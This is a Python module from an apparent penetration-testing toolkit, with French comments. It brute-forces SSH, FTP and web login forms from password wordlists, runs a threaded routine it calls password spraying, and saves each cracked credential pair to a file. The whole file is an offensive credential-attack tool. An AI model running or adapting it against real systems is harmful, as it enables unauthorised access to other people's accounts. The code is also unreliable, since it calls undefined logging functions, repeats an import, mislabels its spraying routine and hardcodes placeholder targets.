# modules/brute.py
import paramiko
import ftplib
import requests
import threading
import time
from queue import Queue
from core.utils import read_wordlist, split_targets
from core.logger import PentestLogger
from core.utils import read_wordlist, split_targets

logger = PentestLogger()  # Utilise le fichier pentest.log par défaut

# -----------------------------
# Configuration globale
# -----------------------------
MAX_RETRIES = 3
THREADS = 5
PROXY = None  # ex: {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# -----------------------------
# Fonction utilitaire pour multi-thread
# -----------------------------
def worker(queue, func, *args):
    while not queue.empty():
        target = queue.get()
        func(target, *args)
        queue.task_done()

# -----------------------------
# SSH Brute Force
# -----------------------------
def brute_ssh(ip, username, wordlist_file):
    passwords = read_wordlist(wordlist_file)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for pwd in passwords:
        pwd = pwd.strip()
        retries = 0
        while retries < MAX_RETRIES:
            try:
                client.connect(ip, username=username, password=pwd, timeout=5)
                log_info(f"[SUCCESS] SSH Login trouvé: {username}:{pwd}")
                log_to_file(f"ssh_success_{ip}.txt", f"{username}:{pwd}")
                client.close()
                return username, pwd
            except paramiko.AuthenticationException:
                log_error(f"[FAILED] {username}:{pwd}")
                break  # mot de passe incorrect, passer au suivant
            except (paramiko.SSHException, Exception) as e:
                retries += 1
                log_error(f"[RETRY {retries}] {e}")
                time.sleep(1)
    log_info("Brute force SSH terminé. Aucun mot de passe trouvé.")
    return None, None

# -----------------------------
# FTP Brute Force
# -----------------------------
def brute_ftp(ip, username, wordlist_file):
    passwords = read_wordlist(wordlist_file)
    for pwd in passwords:
        pwd = pwd.strip()
        retries = 0
        while retries < MAX_RETRIES:
            try:
                ftp = ftplib.FTP(ip, timeout=5)
                ftp.login(username, pwd)
                log_info(f"[SUCCESS] FTP Login trouvé: {username}:{pwd}")
                log_to_file(f"ftp_success_{ip}.txt", f"{username}:{pwd}")
                ftp.quit()
                return username, pwd
            except ftplib.error_perm:
                log_error(f"[FAILED] {username}:{pwd}")
                break
            except Exception as e:
                retries += 1
                log_error(f"[RETRY {retries}] {e}")
                time.sleep(1)
    log_info("Brute force FTP terminé. Aucun mot de passe trouvé.")
    return None, None

# -----------------------------
# Web Form Brute Force
# -----------------------------
def brute_web(url, username_field, password_field, wordlist_file, static_username=None):
    passwords = read_wordlist(wordlist_file)
    usernames = [static_username] if static_username else split_targets("wordlists/usernames.txt")

    for user in usernames:
        for pwd in passwords:
            pwd = pwd.strip()
            retries = 0
            while retries < MAX_RETRIES:
                try:
                    if PROXY:
                        r = requests.post(url, data={username_field: user, password_field: pwd}, timeout=5, proxies=PROXY)
                    else:
                        r = requests.post(url, data={username_field: user, password_field: pwd}, timeout=5)
                    if "Invalid" not in r.text and r.status_code == 200:
                        log_info(f"[SUCCESS] Web Login trouvé: {user}:{pwd}")
                        log_to_file(f"web_success.txt", f"{user}:{pwd}")
                        return user, pwd
                    else:
                        log_error(f"[FAILED] {user}:{pwd}")
                        break
                except Exception as e:
                    retries += 1
                    log_error(f"[RETRY {retries}] {e}")
                    time.sleep(1)
    log_info("Brute force Web terminé. Aucun mot de passe trouvé.")
    return None, None

# -----------------------------
# Password Spraying / Credential Stuffing
# -----------------------------
def password_spraying(targets_file, wordlist_file, service="ssh"):
    users = read_wordlist(targets_file)
    queue = Queue()

    for user in users:
        queue.put(user.strip())

    def spray_worker(user):
        if service.lower() == "ssh":
            brute_ssh("127.0.0.1", user, wordlist_file)  # Adapter l'IP selon cible
        elif service.lower() == "ftp":
            brute_ftp("127.0.0.1", user, wordlist_file)
        elif service.lower() == "web":
            brute_web("http://example.com/login", "username", "password", wordlist_file, static_username=user)
        else:
            log_error(f"Service {service} non supporté pour password spraying.")

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=lambda: worker(queue, spray_worker))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    log_info("Password spraying terminé.")
